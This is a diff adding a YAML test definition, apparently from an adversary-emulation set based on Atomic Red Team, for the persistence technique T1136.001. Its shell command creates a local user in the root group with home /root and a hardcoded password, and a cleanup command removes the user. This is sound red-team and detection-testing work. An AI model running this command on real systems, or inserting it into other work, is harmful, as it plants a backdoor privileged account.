@@ -1,0 +1,39 @@
+- id: a1040a30-d28b-4eda-bd99-bb2861a4616c
+  name: Create a new user in Linux with `root` UID and GID.
+  description: Creates a new user in Linux and adds the user to the `root` group.
+    This technique was used by adversaries during the Butter attack campaign.
+  tactic: persistence
+  technique:
+    attack_id: T1136.001
+    name: 'Create Account: Local Account'
+  platforms:
+    linux:
+      sh:
+        command: useradd -g 0 -M -d /root -s /bin/bash butter; if [ $(cat /etc/os-release
+          | grep -i 'Name="ubuntu"') ]; then echo "butter:BetterWithButter" | sudo
+          chpasswd; else echo "BetterWithButter" | passwd --stdin butter; fi;
+        cleanup: 'userdel #{username}'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - persistence
+  - t1136.001
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      username:
+        description: Username of the user to create
+        type: string
+        default: butter
+      password:
+        description: Password of the user to create
+        type: string
+        default: BetterWithButter
+    technique_created: '2020-01-28T13:50:22.506Z'
+    atomic_guid: a1040a30-d28b-4eda-bd99-bb2861a4616c
+    import_timestamp: '2025-06-24T11:15:56.122662Z'
